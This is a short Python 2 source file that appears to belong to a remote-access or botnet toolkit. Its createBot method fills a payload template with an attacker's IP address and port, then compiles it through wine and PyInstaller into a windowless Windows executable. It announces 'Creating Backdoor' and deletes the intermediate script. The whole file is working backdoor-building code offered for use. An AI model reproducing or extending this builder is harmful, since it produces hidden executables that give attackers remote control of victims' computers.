# Date: 10/08/2017
# Author: Ethical-H4CK3R
# Description: Template Designer
#

import os
from shutil import move 
from subprocess import Popen

class Designer(object):
 def createBot(self, ip, port, name): 
  # create payload
  try:
   with open('template{}template.py'.format(os.path.sep), 'r') as template:
    template = template.read()
   with open('payload{}{}.py'.format(os.path.sep, name), 'w') as client:
    client.write(template.format(port, ip))
  except:return
  cwd = os.getcwd()
  # compile payload
  try:
   Popen('clear'.split()).wait()   
   print 'Creating Backdoor {} {} {} ...'.format(ip, port, name)
   os.chdir('payload')
   with open(os.devnull, 'w') as devnull:
    Popen('wine pyinstaller -F -w {}.py'.format(name), stdout=devnull, stderr=devnull, shell=True).wait()
   os.chdir(cwd) 
   path = '{0}{1}payload{1}dist{1}{2}.exe'.format(cwd, os.path.sep, name)
   move(path, '{0}{1}{2}.exe'.format(cwd, os.path.sep, name))
   os.remove('payload{}{}.py'.format(os.path.sep, name))
  except:os.chdir(cwd)
